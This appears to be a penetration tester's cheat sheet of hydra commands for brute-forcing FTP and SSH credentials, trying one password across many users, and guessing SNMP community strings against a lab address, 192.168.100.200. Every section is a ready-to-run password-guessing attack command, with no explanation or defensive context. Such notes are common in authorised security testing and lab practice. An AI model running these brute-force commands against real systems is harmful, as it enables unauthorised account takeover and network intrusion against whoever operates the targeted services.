# FTP

## Credential Lists 
```bash
hydra -L usernames -P /usr/share/wordlists/rockyou.txt -t 64 ftp://192.168.100.200
```
## Specific User
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 64 ftp://192.168.100.200 
```

## Specific Password
```bash
hydra -L usernames -p password -t 64 ftp://192.168.100.200
```

# SSH

## Credential Lists
```bash
hydra -L usernames -P /usr/share/wordlists/rockyou.txt -t 64 ssh://192.168.100.200
```

## Specific User
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 64 ssh://192.168.100.200
```

## Specific Password
```bash
hydra -L usernames -p password -t 64 ssh://192.168.100.200
```


# SNMP

## Community String List
```bash
hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt -t 64 192.168.100.200 snmp
```
